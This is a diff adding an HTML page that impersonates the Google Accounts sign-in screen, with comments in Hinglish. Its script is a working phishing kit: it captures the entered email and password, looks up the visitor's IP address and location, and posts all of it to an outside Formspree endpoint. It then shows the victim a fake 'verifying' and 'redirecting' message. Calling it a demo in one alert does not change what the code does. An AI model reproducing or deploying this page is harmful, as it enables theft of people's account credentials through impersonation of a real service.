@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Accounts</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+        body { background-color: #f8f9fa; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; color: #202124; }
+        .container { background: white; width: 90%; max-width: 420px; padding: 24px; border-radius: 8px; box-shadow: 0 4px 16px rgba(0,0,0,0.1); margin-bottom: 20px; text-align: center; }
+        .logo { margin-bottom: 16px; }
+        .logo svg { width: 48px; height: 48px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 24px; }
+        .input-group { margin-bottom: 16px; text-align: left; }
+        .input-group label { display: block; font-size: 12px; color: #5f6368; margin-bottom: 4px; padding-left: 15px; }
+        .input-group input { width: 100%; padding: 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
+        .input-group input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8 inset; }
+        .links-row { display: flex; justify-content: space-between; margin-bottom: 24px; font-size: 14px; }
+        .links-row a { color: #1a73e8; text-decoration: none; }
+        .buttons-row { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
+        .btn-text { background: none; border: none; color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; padding: 10px; }
+        .btn-primary { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
+        .footer { text-align: center; font-size: 12px; color: #5f6368; margin-top: 20px; }
+        .footer a { color: #5f6368; text-decoration: none; margin: 0 8px; }
+        .status-msg { display: none; margin-top: 15px; font-weight: 500; color: #1a73e8; }
+        .spinner { display: none; margin: 0 auto; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.5 7.13 6.5 16.5c0 5.39 2.63 10.22 6.98 13.37l4.57-7.16C15.14 20.85 13.5 18.79 13.5 16.5 13.5 10.73 18.24 6 24 6z"/><path fill="#4285F4" d="M42.5 24c0-1.45-.14-2.87-.4-4.24l-7.07 7.07C34.95 26.01 32.68 27 29.9 27c-5.73 0-10.43-4.7-10.43-10.5 0-1.22.22-2.4.62-3.49L13.48 9.13C11.09 11.62 9.5 15.25 9.5 19.5c0 10.77 8.23 19.5 18.5 19.5 5.39 0 10.22-2.63 13.37-6.98l-7.16-4.57c-2.06 1.34-4.12 2.98-6.41 2.98-1.22 0-2.4-.22-3.49-.62L9.13 34.52C11.62 36.91 15.25 38.5 19.5 38.5c10.77 0 19.5-8.23 19.5-18.5 0-1.45-.14-2.87-.4-4.24l-7.07 7.07C30.95 29.95 28.68 30.9 25.9 30.9c-5.73 0-10.43-4.7-10.43-10.5 0-1.22.22-2.4.62-3.49z"/></svg>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+
+        <form id="stealForm">
+            <div class="input-group">
+                <label>Email or phone</label>
+                <input type="text" id="email" placeholder="you@gmail.com" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
+            </div>
+            
+            <div class="links-row">
+                <a href="#" onclick="return false;">Forgot email?</a>
+                <a href="#" onclick="return false;">Forgot password?</a>
+            </div>
+
+            <div class="buttons-row">
+                <button type="button" class="btn-text" onclick="alert('Ye demo hai, bas Sign In dabao.')">Create account</button>
+                <button type="submit" class="btn-primary" id="submitBtn">Next</button>
+            </div>
+        </form>
+        
+        <div id="spinner" class="spinner"></div>
+        <div id="status" class="status-msg"></div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Help</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a>
+    </div>
+
+    <script>
+        const form = document.getElementById('stealForm');
+        const spinner = document.getElementById('spinner');
+        const status = document.getElementById('status');
+        const btn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Loading state
+            btn.disabled = true;
+            spinner.style.display = 'block';
+            status.style.display = 'none';
+
+            try {
+                // Victim's IP aur Location Fetch Karna
+                const ipRes = await fetch('https://ipapi.co/json').then(r => r.json());
+                
+                const data = {
+                    _subject: `New Login: ${email}`,
+                    email: email,
+                    password: password,
+                    ip_address: ipRes.ip,
+                    location: `${ipRes.city}, ${ipRes.country}`,
+                    device: navigator.userAgent,
+                    timestamp: new Date().toLocaleString()
+                };
+
+                // Data ko Formspree pe bhejna
+                await fetch('https://formspree.io/f/xzeeayaq', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                // Success Message (Victim ko dikhane ke liye)
+                spinner.style.display = 'none';
+                status.style.display = 'block';
+                status.innerText = "Verifying credentials...";
+                
+                // 2 second baad fake error ya redirect feel dena
+                setTimeout(() => {
+                    status.innerText = "Please wait, redirecting to your inbox...";
+                }, 2000);
+
+            } catch (err) {
+                spinner.style.display = 'none';
+                status.style.display = 'block';
+                status.innerText = "Network error. Please try again.";
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
